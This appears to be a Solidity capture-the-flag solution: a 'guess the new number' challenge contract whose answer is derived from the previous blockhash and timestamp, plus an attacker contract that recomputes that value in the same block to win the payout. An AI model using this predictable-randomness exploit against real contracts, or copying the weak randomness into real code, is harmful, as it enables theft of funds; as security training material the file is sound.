pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
  function GuessTheNewNumberChallenge() public payable {
    require(msg.value == 1 ether);
  }

  function isComplete() public view returns (bool) {
    return address(this).balance == 0;
  }

  function guess(uint8 n) public payable {
    require(msg.value == 1 ether);
    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

    if (n == answer) {
      msg.sender.transfer(2 ether);
    }
  }
}

contract GuessTheNewNumberAttacker {
  GuessTheNewNumberChallenge victim;

  function GuessTheNewNumberAttacker(address victim_) public {
    victim = GuessTheNewNumberChallenge(victim_);
  }

  function attack() external payable {
    require(msg.value == 1 ether);

    bool success = (address(victim)).call.value(msg.value)(
      bytes4(keccak256('guess(uint8)')),
      uint8(keccak256(block.blockhash(block.number - 1), now))
    );

    // Check if the function call was successful
    require(success);
  }

  function() public payable {}
}
